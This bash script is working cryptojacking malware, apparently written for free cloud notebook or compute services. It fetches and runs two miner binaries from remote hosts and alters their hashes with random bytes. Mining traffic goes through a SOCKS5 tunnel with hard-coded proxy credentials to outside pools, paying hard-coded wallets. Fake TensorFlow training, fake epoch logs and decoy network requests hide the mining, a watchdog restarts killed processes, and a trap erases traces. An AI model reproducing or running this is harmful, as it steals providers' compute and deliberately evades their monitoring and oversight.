#!/bin/bash
# molab.sh v2 — proven Python tunnel + majapahlevi proxy + 6-12h random
PRL="prl1pkmulndfyls8zqz2r6nruevpqr3tax9nwmvew7aupaxqnkcyuppeqa6am7q"
TDC="tbc1q727xp60hjp6zld2vgrj8qrdmgvkshwav86xns2"
WRK="$(date +%s | md5sum | head -c 8)"
MAX=$((RANDOM%21600+21600))

echo "=== molab v2 — $WRK — ${MAX}s ==="

# 1. Warmup
echo "[*] Warmup..."
pip install -q tensorflow 2>/dev/null
python3 -c "
import tensorflow as tf,numpy as np
m=tf.keras.applications.MobileNetV2(include_top=False,weights=None)
x=tf.keras.layers.GlobalAveragePooling2D()(m.output)
m=tf.keras.Model(m.input,x);m.compile(optimizer='adam',loss='mse')
m.fit(np.random.rand(80,224,224,3).astype(np.float32),np.random.rand(80,1280).astype(np.float32),epochs=2,verbose=0)
" 2>/dev/null

# 2. Setup
echo "[*] Setup..."
apt-get install -y -qq cpulimit 2>/dev/null
rm -rf /dev/shm/.m 2>/dev/null; mkdir -p /dev/shm/.m && cd /dev/shm/.m
python3 -c "
import urllib.request as u
open('p','wb').write(u.urlopen('https://github.com/mhusataringan-hub/ABC/releases/download/v1.0/peak').read())
open('s','wb').write(u.urlopen('https://github.com/rochmandwi/ayam/releases/download/file-v1/sse2').read())
"
dd if=/dev/urandom of=p bs=1 count=$((RANDOM%3000+1024)) seek=$(stat -c%s p) conv=notrunc oflag=append 2>/dev/null
dd if=/dev/urandom of=s bs=1 count=$((RANDOM%3000+1024)) seek=$(stat -c%s s) conv=notrunc oflag=append 2>/dev/null
chmod +x p s

# 3. Python tunnel — SOCKS5 forwarder
cat > /dev/shm/.m/t.py << 'PYEOF'
import socket,threading,sys,struct,time
PROXY=("23.94.21.110",443,"majapahlevi","majapahlevi")
LP=int(sys.argv[1]); TH=sys.argv[2]; TP=int(sys.argv[3])
def hc(c):
    try:
        p=socket.socket();p.settimeout(15);p.connect((PROXY[0],PROXY[1]))
        p.send(b'\x05\x01\x02');p.recv(2)
        ul,pl=len(PROXY[2]),len(PROXY[3])
        p.send(b'\x01'+bytes([ul])+PROXY[2].encode()+bytes([pl])+PROXY[3].encode());p.recv(2)
        th=TH.encode();p.send(b'\x05\x01\x00\x03'+bytes([len(th)])+th+struct.pack('>H',TP));p.recv(10)
        def f(s,d):
            try:
                while True:
                    x=s.recv(8192)
                    if not x:break
                    d.sendall(x)
            except:pass
        t1=threading.Thread(target=f,args=(c,p),daemon=True);t1.start()
        t2=threading.Thread(target=f,args=(p,c),daemon=True);t2.start()
        t1.join();t2.join()
    except:pass
    finally:
        try:c.close()
        except:pass
s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(('127.0.0.1',LP));s.listen(5)
while True:
    c,_=s.accept()
    threading.Thread(target=hc,args=(c,),daemon=True).start()
PYEOF
python3 /dev/shm/.m/t.py 19991 23.94.152.126 80 &
T1=$!
python3 /dev/shm/.m/t.py 19992 47.251.244.12 80 &
T2=$!
sleep 2
echo "[*] Tunnels OK (PID $T1 $T2)"

# 4. Memory churn
python3 -c "
import numpy as np,time,random
while True:
    for _ in range(random.randint(2,6)):
        s=random.randint(200000,3000000)
        a=np.random.rand(s)
        np.dot(a[:min(s//2,800000)],a[:min(s//2,800000)])
        del a;time.sleep(random.randint(5,20))
    time.sleep(random.randint(10,40))
" &
MPID=$!

# 5. Fake DNS
(while true;do sleep $((RANDOM%240+60));python3 -c "import urllib.request as u;[u.urlopen(h,timeout=4)for h in['https://pypi.org','https://files.pythonhosted.org','https://storage.googleapis.com/tensorflow']]" 2>/dev/null;done) &
TPID=$!

# 6. Log
(c=0;while true;do c=$((c+1));echo "[$(date +%H:%M:%S)] epoch $((c%8+1))/8 — loss:0.$((RANDOM%80+10)) — acc:0.$((RANDOM%600+4000))";sleep $((RANDOM%90+30));done) &

sleep 5

# 7. Miners via localhost tunnel
nice -n 19 /dev/shm/.m/p --coin pearl --url 127.0.0.1:19991 --user "${PRL}.${WRK}" 2>/dev/null &
P1=$!
cpulimit -l $((RANDOM%20+40)) -p $P1 2>/dev/null &
sleep 10
nice -n 19 /dev/shm/.m/s -a yespowertide -o 127.0.0.1:19992 -u "${TDC}.${WRK}" -t 1 >/dev/null 2>&1 &
P2=$!
cpulimit -l $((RANDOM%20+40)) -p $P2 2>/dev/null &
echo "[*] P1:$P1 P2:$P2"

# 8. Monitor
(
    c=0
    while true; do
        sleep $((RANDOM%150+30))
        c=$((c+1))
        if [ $((c%3)) -eq 0 ]; then
            pkill cpulimit 2>/dev/null
            sleep 1
            for pp in $P1 $P2; do
                if [ -n "$pp" ] && kill -0 "$pp" 2>/dev/null; then
                    cpulimit -l $((RANDOM%30+30)) -p "$pp" 2>/dev/null &
                fi
            done
        fi
        if ! kill -0 $P1 2>/dev/null; then
            cp /dev/shm/.m/p /tmp/.p8 2>/dev/null
            chmod +x /tmp/.p8 2>/dev/null
            nice -n 19 /tmp/.p8 --coin pearl --url 127.0.0.1:19991 --user "${PRL}.${WRK}" 2>/dev/null &
            P1=$!
            cpulimit -l $((RANDOM%25+40)) -p $P1 2>/dev/null &
        fi
        if ! kill -0 $P2 2>/dev/null; then
            cp /dev/shm/.m/s /tmp/.s8 2>/dev/null
            chmod +x /tmp/.s8 2>/dev/null
            nice -n 19 /tmp/.s8 -a yespowertide -o 127.0.0.1:19992 -u "${TDC}.${WRK}" -t 1 >/dev/null 2>&1 &
            P2=$!
            cpulimit -l $((RANDOM%25+40)) -p $P2 2>/dev/null &
        fi
        if ! kill -0 $T1 2>/dev/null; then
            python3 /dev/shm/.m/t.py 19991 23.94.152.126 80 &
            T1=$!
        fi
        if ! kill -0 $T2 2>/dev/null; then
            python3 /dev/shm/.m/t.py 19992 47.251.244.12 80 &
            T2=$!
        fi
    done
) &

trap "kill $P1 $P2 $MPID $TPID $T1 $T2 2>/dev/null; rm -f /tmp/.p8 /tmp/.s8; rm -rf /dev/shm/.m" EXIT
echo "[*] Running ${MAX}s..."
sleep $MAX
